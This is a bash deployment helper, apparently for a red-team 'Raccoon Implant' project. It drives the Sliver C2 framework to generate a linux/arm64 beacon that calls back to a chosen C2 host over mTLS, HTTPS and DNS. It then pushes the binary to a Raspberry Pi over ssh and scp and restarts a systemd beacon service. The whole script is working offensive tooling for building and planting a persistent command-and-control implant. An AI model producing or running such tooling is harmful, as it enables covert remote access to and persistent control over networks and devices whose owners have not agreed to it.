#!/bin/bash
# Raccoon Implant — Sliver Implant Deployment Helper
#
# Usage (run on the OPERATOR machine with Sliver server access):
#
#   1. Generate the implant:
#      ./deploy_sliver.sh generate
#
#   2. Deploy to the implant device:
#      ./deploy_sliver.sh deploy <pi_ip> [user]
#
#   3. Or do both at once:
#      ./deploy_sliver.sh full <pi_ip> [user]
set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

IMPLANT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)/bin"
IMPLANT_FILE="${IMPLANT_DIR}/implant"
REMOTE_PATH="/opt/raccoon/bin/implant"

usage() {
    echo -e "${CYAN}Raccoon Implant — Sliver Deployment${NC}"
    echo ""
    echo "Usage:"
    echo "  $0 generate                     Generate Sliver beacon (interactive)"
    echo "  $0 generate-auto <c2_host>      Generate with defaults (HTTPS+DNS beacon)"
    echo "  $0 deploy <pi_ip> [user]        Deploy binary to implant device"
    echo "  $0 full <c2_host> <pi_ip> [user] Generate + deploy"
    echo ""
}

check_sliver() {
    if ! command -v sliver-client &>/dev/null && ! command -v sliver &>/dev/null; then
        echo -e "${RED}[!] Sliver client not found in PATH${NC}"
        echo "    Install: https://github.com/BishopFox/sliver/wiki/Getting-Started"
        exit 1
    fi
}

generate_interactive() {
    check_sliver
    echo -e "${YELLOW}[*] Starting Sliver client for interactive implant generation${NC}"
    echo ""
    echo -e "${CYAN}Recommended command inside Sliver:${NC}"
    echo ""
    echo "  generate beacon --os linux --arch arm64 \\"
    echo "    --mtls <your-c2-host>:8888 \\"
    echo "    --http <your-c2-host> \\"
    echo "    --dns <your-c2-domain> \\"
    echo "    --seconds 300 --jitter 20 \\"
    echo "    --skip-symbols \\"
    echo "    --name raccoon \\"
    echo "    --save ${IMPLANT_FILE}"
    echo ""
    echo -e "${YELLOW}After generating, exit Sliver and run:${NC}"
    echo "  $0 deploy <pi_ip>"
    echo ""

    if command -v sliver &>/dev/null; then
        sliver
    else
        sliver-client
    fi
}

generate_auto() {
    local C2_HOST="$1"
    if [ -z "$C2_HOST" ]; then
        echo -e "${RED}[!] C2 host required: $0 generate-auto <c2_host>${NC}"
        exit 1
    fi

    check_sliver
    mkdir -p "$IMPLANT_DIR"

    echo -e "${GREEN}[+] Generating Sliver beacon for linux/arm64${NC}"
    echo -e "    C2 Host: ${C2_HOST}"
    echo -e "    Channels: mTLS(:8888) + HTTPS(:443) + DNS"
    echo -e "    Beacon: 300s interval, 20% jitter"

    # Use sliver-client in non-interactive mode
    local SLIVER_CMD="generate beacon \
        --os linux --arch arm64 \
        --mtls ${C2_HOST}:8888 \
        --http ${C2_HOST} \
        --dns ${C2_HOST} \
        --seconds 300 --jitter 20 \
        --skip-symbols \
        --name raccoon \
        --save ${IMPLANT_FILE}"

    if command -v sliver &>/dev/null; then
        echo "$SLIVER_CMD" | sliver
    else
        echo "$SLIVER_CMD" | sliver-client
    fi

    if [ -f "$IMPLANT_FILE" ]; then
        chmod 700 "$IMPLANT_FILE"
        local SIZE=$(du -h "$IMPLANT_FILE" | cut -f1)
        local HASH=$(sha256sum "$IMPLANT_FILE" | cut -d' ' -f1)
        echo ""
        echo -e "${GREEN}[+] Implant generated:${NC}"
        echo "    Path:   ${IMPLANT_FILE}"
        echo "    Size:   ${SIZE}"
        echo "    SHA256: ${HASH}"
        echo ""
        echo -e "${YELLOW}Update configs/raccoon.yaml with:${NC}"
        echo "    sliver.sha256: \"${HASH}\""
    else
        echo -e "${RED}[!] Implant generation failed${NC}"
        exit 1
    fi
}

deploy() {
    local PI_IP="$1"
    local PI_USER="${2:-root}"

    if [ -z "$PI_IP" ]; then
        echo -e "${RED}[!] Pi IP required: $0 deploy <pi_ip> [user]${NC}"
        exit 1
    fi

    if [ ! -f "$IMPLANT_FILE" ]; then
        echo -e "${RED}[!] No implant binary at ${IMPLANT_FILE}${NC}"
        echo "    Run '$0 generate' first"
        exit 1
    fi

    echo -e "${GREEN}[+] Deploying Sliver implant to ${PI_USER}@${PI_IP}${NC}"

    # Create remote directory
    ssh "${PI_USER}@${PI_IP}" "mkdir -p $(dirname ${REMOTE_PATH})"

    # Transfer binary
    scp "$IMPLANT_FILE" "${PI_USER}@${PI_IP}:${REMOTE_PATH}"

    # Set permissions and restart beacon
    ssh "${PI_USER}@${PI_IP}" "chmod 700 ${REMOTE_PATH} && systemctl restart raccoon-beacon.service 2>/dev/null || true"

    local HASH=$(sha256sum "$IMPLANT_FILE" | cut -d' ' -f1)
    echo ""
    echo -e "${GREEN}[+] Deployed successfully${NC}"
    echo "    Remote: ${PI_USER}@${PI_IP}:${REMOTE_PATH}"
    echo "    SHA256: ${HASH}"
    echo ""
    echo -e "${YELLOW}Verify on target:${NC}"
    echo "  ssh ${PI_USER}@${PI_IP} 'systemctl status raccoon-beacon'"
    echo ""
}

case "${1:-}" in
    generate)
        generate_interactive
        ;;
    generate-auto)
        generate_auto "$2"
        ;;
    deploy)
        deploy "$2" "$3"
        ;;
    full)
        generate_auto "$2"
        deploy "$3" "${4:-root}"
        ;;
    *)
        usage
        exit 1
        ;;
esac
